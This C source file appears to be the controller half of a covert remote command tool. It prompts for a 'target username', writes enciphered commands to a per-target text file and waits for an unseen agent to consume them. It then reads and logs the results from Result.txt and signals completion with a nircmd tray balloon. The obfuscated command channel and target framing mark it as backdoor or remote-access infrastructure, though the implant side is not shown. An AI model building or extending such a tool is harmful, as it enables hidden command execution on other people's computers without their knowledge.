#include <stdio.h>
#include "emptyFileCheck.h"
#include "coder.h"
#include "Execute.h"
#include "sizeFixer.h"


void main(){

    char userInput[100];
    char commandInput[100];

    printf("Enter your target username: \n");

    fgets(userInput, sizeof(userInput), stdin);

    sizeFixer(userInput);

    char filename[100];
    snprintf(filename, sizeof(filename), "%s.txt", userInput);


Loop:

    FILE *user_specific_file = fopen(filename, "a");

    printf("Enter your command: \n");

    fgets(commandInput, sizeof(commandInput), stdin);

    sizeFixer(commandInput);

    cipher(commandInput,0);

    fprintf(user_specific_file, "%s", commandInput);

    fclose(user_specific_file);

    user_specific_file = fopen(filename, "r");

    while (!is_empty(user_specific_file))
    {
        Sleep(1000);
    }

    fclose(user_specific_file);

    cipher(commandInput,1);

    FILE *log;
    log = fopen("Log.txt", "a");
    fprintf(log, "\n%s\n\n", commandInput);
    fclose(log);

    if (!check_first_six_words(commandInput)){
        
        FILE *fp;
        
  
        char buffer[500];
        fp = fopen("Result.txt", "r");
        log = fopen("Log.txt", "a");

        while (fgets(buffer, sizeof(buffer),fp) != NULL)
        {

            printf("%s", buffer);
                    
            fprintf(log, "%s", buffer);

        }

        fclose(fp);
        fclose(log);

        fp = fopen("Result.txt", "w");
        fclose(fp);
    }

    Nircmd("nircmd trayballoon \"Commander\" \"Terminé\" \"shell32.dll,27\" 3000");

    if(strcmp(commandInput, "Tamam") == 0){
        exit(1);
    }


    goto Loop;
}